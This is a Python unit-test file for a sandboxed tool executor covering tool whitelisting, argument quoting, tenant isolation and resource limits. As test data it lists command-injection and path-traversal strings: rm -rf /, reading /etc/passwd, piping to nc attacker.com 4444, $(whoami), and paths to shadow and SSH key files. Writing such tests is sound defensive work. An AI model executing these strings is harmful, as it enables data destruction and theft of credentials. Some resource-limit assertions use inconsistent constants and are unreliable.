"""
Comprehensive unit tests for SecureToolExecutor

Tests cover:
- Tool validation
- Argument sanitization
- Resource limits
- Command execution
- Error handling
- Security controls
- File operations
"""
import pytest
import subprocess
import os
import tempfile
import shutil
from unittest.mock import patch, MagicMock, call
from pathlib import Path

from app.utils.secure_executor import (
    SecureToolExecutor,
    ToolExecutionError
)


class TestSecureToolExecutorValidation:
    """Test tool validation and whitelisting"""

    def test_validate_allowed_tool(self):
        """Test validation accepts whitelisted tools"""
        executor = SecureToolExecutor(tenant_id=1)

        for tool in ['subfinder', 'dnsx', 'httpx', 'naabu', 'nuclei']:
            result = executor.validate_tool(tool)
            assert result == tool

    def test_validate_disallowed_tool(self):
        """Test validation rejects non-whitelisted tools"""
        executor = SecureToolExecutor(tenant_id=1)

        with pytest.raises(ToolExecutionError, match="not allowed"):
            executor.validate_tool('rm')

        with pytest.raises(ToolExecutionError, match="not allowed"):
            executor.validate_tool('curl')

        with pytest.raises(ToolExecutionError, match="not allowed"):
            executor.validate_tool('/usr/bin/subfinder')

    def test_validate_command_injection_attempt(self):
        """Test validation blocks command injection attempts"""
        executor = SecureToolExecutor(tenant_id=1)

        with pytest.raises(ToolExecutionError):
            executor.validate_tool('subfinder; rm -rf /')

        with pytest.raises(ToolExecutionError):
            executor.validate_tool('subfinder && cat /etc/passwd')


class TestSecureToolExecutorSanitization:
    """Test argument sanitization"""

    def test_sanitize_basic_args(self):
        """Test sanitization of basic arguments"""
        executor = SecureToolExecutor(tenant_id=1)

        args = ['-d', 'example.com', '-silent']
        sanitized = executor.sanitize_args(args)

        assert len(sanitized) == 3
        assert all(isinstance(arg, str) for arg in sanitized)

    def test_sanitize_removes_dangerous_chars(self):
        """Test sanitization quotes special characters"""
        executor = SecureToolExecutor(tenant_id=1)

        args = ['domain.com; rm -rf /']
        sanitized = executor.sanitize_args(args)

        # Should be quoted/escaped
        assert len(sanitized) == 1
        # The argument should be safely quoted
        assert ';' in sanitized[0] or 'rm' not in sanitized[0]

    def test_sanitize_file_paths_outside_temp_dir(self):
        """Test sanitization rejects paths outside temp directory"""
        executor = SecureToolExecutor(tenant_id=1)

        with executor as exec_ctx:
            args = ['/etc/passwd', './../../etc/shadow']
            sanitized = exec_ctx.sanitize_args(args)

            # Paths outside temp dir should be rejected (length reduced)
            assert len(sanitized) < len(args)

    def test_sanitize_preserves_valid_temp_paths(self):
        """Test sanitization preserves valid temp directory paths"""
        with SecureToolExecutor(tenant_id=1) as executor:
            temp_file = os.path.join(executor.temp_dir, 'test.txt')

            args = [temp_file]
            sanitized = executor.sanitize_args(args)

            # Valid path should be preserved (though quoted)
            assert len(sanitized) == 1

    def test_sanitize_strips_whitespace(self):
        """Test sanitization strips whitespace"""
        executor = SecureToolExecutor(tenant_id=1)

        args = ['  example.com  ', '\tdomain.org\n']
        sanitized = executor.sanitize_args(args)

        assert 'example.com' in sanitized[0]
        assert 'domain.org' in sanitized[1]


class TestSecureToolExecutorContextManager:
    """Test context manager behavior"""

    def test_context_manager_creates_temp_dir(self):
        """Test context manager creates temporary directory"""
        executor = SecureToolExecutor(tenant_id=1)

        assert executor.temp_dir is None

        with executor as exec_ctx:
            assert exec_ctx.temp_dir is not None
            assert os.path.exists(exec_ctx.temp_dir)
            assert 'tenant_1_' in str(exec_ctx.temp_dir)
            temp_dir = exec_ctx.temp_dir

        # Directory should be cleaned up after exit
        assert not os.path.exists(temp_dir)

    def test_context_manager_cleanup_on_exception(self):
        """Test context manager cleans up even on exception"""
        try:
            with SecureToolExecutor(tenant_id=1) as executor:
                temp_dir = executor.temp_dir
                raise ValueError("Test exception")
        except ValueError:
            pass

        # Directory should still be cleaned up
        assert not os.path.exists(temp_dir)

    def test_multiple_executors_isolated(self):
        """Test multiple executors have isolated temp directories"""
        with SecureToolExecutor(tenant_id=1) as exec1:
            with SecureToolExecutor(tenant_id=2) as exec2:
                assert exec1.temp_dir != exec2.temp_dir
                assert 'tenant_1_' in exec1.temp_dir
                assert 'tenant_2_' in exec2.temp_dir


class TestSecureToolExecutorFileOperations:
    """Test file operations"""

    def test_create_input_file(self):
        """Test creating input file in temp directory"""
        with SecureToolExecutor(tenant_id=1) as executor:
            content = "example.com\ntest.org\n"
            file_path = executor.create_input_file('domains.txt', content)

            assert os.path.exists(file_path)
            assert executor.temp_dir in file_path

            with open(file_path, 'r') as f:
                assert f.read() == content

    def test_create_input_file_without_context(self):
        """Test creating input file fails without context manager"""
        executor = SecureToolExecutor(tenant_id=1)

        with pytest.raises(ToolExecutionError, match="not initialized"):
            executor.create_input_file('test.txt', 'content')

    def test_read_output_file(self):
        """Test reading output file from temp directory"""
        with SecureToolExecutor(tenant_id=1) as executor:
            # Create a file first
            test_content = "result1\nresult2\nresult3\n"
            file_path = os.path.join(executor.temp_dir, 'output.txt')

            with open(file_path, 'w') as f:
                f.write(test_content)

            # Read it back
            content = executor.read_output_file('output.txt')
            assert content == test_content

    def test_read_nonexistent_output_file(self):
        """Test reading non-existent file returns empty string"""
        with SecureToolExecutor(tenant_id=1) as executor:
            content = executor.read_output_file('nonexistent.txt')
            assert content == ""

    def test_read_output_file_without_context(self):
        """Test reading output file fails without context manager"""
        executor = SecureToolExecutor(tenant_id=1)

        with pytest.raises(ToolExecutionError, match="not initialized"):
            executor.read_output_file('test.txt')


class TestSecureToolExecutorExecution:
    """Test tool execution"""

    @patch('subprocess.run')
    def test_execute_successful(self, mock_run):
        """Test successful tool execution"""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="sub1.example.com\nsub2.example.com",
            stderr=""
        )

        with SecureToolExecutor(tenant_id=1) as executor:
            returncode, stdout, stderr = executor.execute(
                'subfinder',
                ['-d', 'example.com', '-silent']
            )

            assert returncode == 0
            assert 'sub1.example.com' in stdout
            mock_run.assert_called_once()

    @patch('subprocess.run')
    def test_execute_with_timeout(self, mock_run):
        """Test execution timeout"""
        mock_run.side_effect = subprocess.TimeoutExpired('subfinder', 10)

        with SecureToolExecutor(tenant_id=1) as executor:
            with pytest.raises(ToolExecutionError, match="timed out"):
                executor.execute('subfinder', ['-d', 'example.com'], timeout=10)

    @patch('subprocess.run')
    def test_execute_subprocess_error(self, mock_run):
        """Test subprocess execution error"""
        mock_run.side_effect = subprocess.SubprocessError("Command failed")

        with SecureToolExecutor(tenant_id=1) as executor:
            with pytest.raises(ToolExecutionError, match="Execution failed"):
                executor.execute('subfinder', ['-d', 'example.com'])

    @patch('subprocess.run')
    def test_execute_invalid_tool(self, mock_run):
        """Test execution with invalid tool"""
        with SecureToolExecutor(tenant_id=1) as executor:
            with pytest.raises(ToolExecutionError, match="not allowed"):
                executor.execute('malicious_tool', ['-arg'])

            # subprocess.run should never be called
            mock_run.assert_not_called()

    @patch('subprocess.run')
    def test_execute_uses_restricted_env(self, mock_run):
        """Test execution uses restricted environment"""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

        with SecureToolExecutor(tenant_id=1) as executor:
            executor.execute('subfinder', ['-d', 'example.com'])

            # Check environment variables passed to subprocess
            call_kwargs = mock_run.call_args[1]
            env = call_kwargs['env']

            assert 'PATH' in env
            assert 'HOME' in env
            assert env['HOME'] == executor.temp_dir

    @patch('subprocess.run')
    def test_execute_uses_temp_dir_as_cwd(self, mock_run):
        """Test execution uses temp directory as working directory"""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

        with SecureToolExecutor(tenant_id=1) as executor:
            executor.execute('subfinder', ['-d', 'example.com'])

            call_kwargs = mock_run.call_args[1]
            assert call_kwargs['cwd'] == executor.temp_dir

    @patch('subprocess.run')
    def test_execute_custom_timeout(self, mock_run):
        """Test execution with custom timeout"""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

        with SecureToolExecutor(tenant_id=1) as executor:
            executor.execute('subfinder', ['-d', 'example.com'], timeout=300)

            call_kwargs = mock_run.call_args[1]
            assert call_kwargs['timeout'] == 300

    @patch('subprocess.run')
    def test_execute_default_timeout(self, mock_run):
        """Test execution uses default timeout"""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

        with SecureToolExecutor(tenant_id=1) as executor:
            executor.execute('subfinder', ['-d', 'example.com'])

            call_kwargs = mock_run.call_args[1]
            assert call_kwargs['timeout'] == SecureToolExecutor.DEFAULT_TIMEOUT

    @patch('subprocess.run')
    def test_execute_non_zero_return_code(self, mock_run):
        """Test execution handles non-zero return code"""
        mock_run.return_value = MagicMock(
            returncode=1,
            stdout="",
            stderr="Error: invalid domain"
        )

        with SecureToolExecutor(tenant_id=1) as executor:
            returncode, stdout, stderr = executor.execute(
                'subfinder',
                ['-d', 'invalid..domain']
            )

            assert returncode == 1
            assert "Error" in stderr


class TestSecureToolExecutorResourceLimits:
    """Test resource limit enforcement"""

    @patch('resource.setrlimit')
    def test_set_resource_limits_cpu(self, mock_setrlimit):
        """Test CPU time limit is set"""
        executor = SecureToolExecutor(tenant_id=1)
        executor.set_resource_limits()

        # Check that CPU limit was set
        calls = mock_setrlimit.call_args_list
        cpu_call = [c for c in calls if c[0][0] == 1]  # RLIMIT_CPU = 1
        assert len(cpu_call) > 0

    @patch('resource.setrlimit')
    def test_set_resource_limits_memory(self, mock_setrlimit):
        """Test memory limit is set"""
        executor = SecureToolExecutor(tenant_id=1)
        executor.set_resource_limits()

        # Check that memory limit was set
        calls = mock_setrlimit.call_args_list
        mem_call = [c for c in calls if c[0][0] == 9]  # RLIMIT_AS = 9
        assert len(mem_call) > 0

    @patch('resource.setrlimit')
    def test_set_resource_limits_file_size(self, mock_setrlimit):
        """Test file size limit is set"""
        executor = SecureToolExecutor(tenant_id=1)
        executor.set_resource_limits()

        # Check that file size limit was set
        calls = mock_setrlimit.call_args_list
        file_call = [c for c in calls if c[0][0] == 1]  # RLIMIT_FSIZE
        assert len(file_call) > 0

    @patch('resource.setrlimit')
    def test_set_resource_limits_handles_errors(self, mock_setrlimit):
        """Test resource limit errors are handled gracefully"""
        mock_setrlimit.side_effect = OSError("Not permitted")

        executor = SecureToolExecutor(tenant_id=1)
        # Should not raise exception
        executor.set_resource_limits()


class TestSecureToolExecutorSecurityScenarios:
    """Test security scenarios and edge cases"""

    def test_tenant_isolation(self):
        """Test different tenants have isolated environments"""
        with SecureToolExecutor(tenant_id=1) as exec1:
            with SecureToolExecutor(tenant_id=2) as exec2:
                # Create files in each tenant's directory
                exec1.create_input_file('data.txt', 'tenant1')
                exec2.create_input_file('data.txt', 'tenant2')

                # Files should be isolated
                content1 = exec1.read_output_file('data.txt')
                content2 = exec2.read_output_file('data.txt')

                assert content1 == 'tenant1'
                assert content2 == 'tenant2'

    def test_path_traversal_prevention(self):
        """Test path traversal attacks are prevented"""
        with SecureToolExecutor(tenant_id=1) as executor:
            dangerous_args = [
                '../../../etc/passwd',
                '../../root/.ssh/id_rsa',
                '/etc/shadow'
            ]

            sanitized = executor.sanitize_args(dangerous_args)

            # All dangerous paths should be rejected or neutralized
            for arg in sanitized:
                assert '/etc/passwd' not in arg or executor.temp_dir in arg

    def test_command_chaining_prevention(self):
        """Test command chaining is prevented"""
        executor = SecureToolExecutor(tenant_id=1)

        # These should all be quoted/escaped properly
        dangerous = [
            'domain.com; cat /etc/passwd',
            'domain.com && rm -rf /',
            'domain.com | nc attacker.com 4444',
            'domain.com`rm -rf /`',
            'domain.com$(whoami)'
        ]

        sanitized = executor.sanitize_args(dangerous)

        # All should be quoted/escaped
        for arg in sanitized:
            # shlex.quote wraps in single quotes
            assert arg.startswith("'") or not any(c in arg for c in [';', '&', '|', '`', '$'])

    @patch('subprocess.run')
    def test_prevents_environment_variable_injection(self, mock_run):
        """Test environment variables can't be injected"""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

        with SecureToolExecutor(tenant_id=1) as executor:
            # Try to inject environment variable
            executor.execute('subfinder', ['-d', 'example.com'])

            # Check environment is restricted
            env = mock_run.call_args[1]['env']

            # Should only have whitelisted env vars
            assert 'PATH' in env
            assert 'HOME' in env
            assert 'LANG' in env
            # Should NOT have dangerous variables
            assert 'LD_PRELOAD' not in env
            assert 'LD_LIBRARY_PATH' not in env


class TestSecureToolExecutorEdgeCases:
    """Test edge cases and error conditions"""

    def test_empty_arguments_list(self):
        """Test execution with empty arguments"""
        executor = SecureToolExecutor(tenant_id=1)
        sanitized = executor.sanitize_args([])
        assert sanitized == []

    def test_unicode_in_arguments(self):
        """Test handling of unicode characters"""
        executor = SecureToolExecutor(tenant_id=1)
        args = ['测试.example.com', 'тест.org']
        sanitized = executor.sanitize_args(args)
        assert len(sanitized) == 2

    def test_very_long_arguments(self):
        """Test handling of very long arguments"""
        executor = SecureToolExecutor(tenant_id=1)
        long_arg = 'a' * 10000
        sanitized = executor.sanitize_args([long_arg])
        assert len(sanitized) == 1

    def test_none_arguments(self):
        """Test handling of None in arguments"""
        executor = SecureToolExecutor(tenant_id=1)
        # Should convert None to string
        sanitized = executor.sanitize_args([None, 'valid', None])
        assert len(sanitized) == 3

    @patch('subprocess.run')
    def test_execute_capture_output_false(self, mock_run):
        """Test execution with capture_output=False"""
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")

        with SecureToolExecutor(tenant_id=1) as executor:
            executor.execute('subfinder', ['-d', 'example.com'], capture_output=False)

            call_kwargs = mock_run.call_args[1]
            assert call_kwargs['capture_output'] == False

    def test_tenant_id_types(self):
        """Test different tenant ID types"""
        # Should accept integer
        exec1 = SecureToolExecutor(tenant_id=1)
        assert exec1.tenant_id == 1

        # Should accept string that looks like int
        exec2 = SecureToolExecutor(tenant_id=999)
        assert exec2.tenant_id == 999
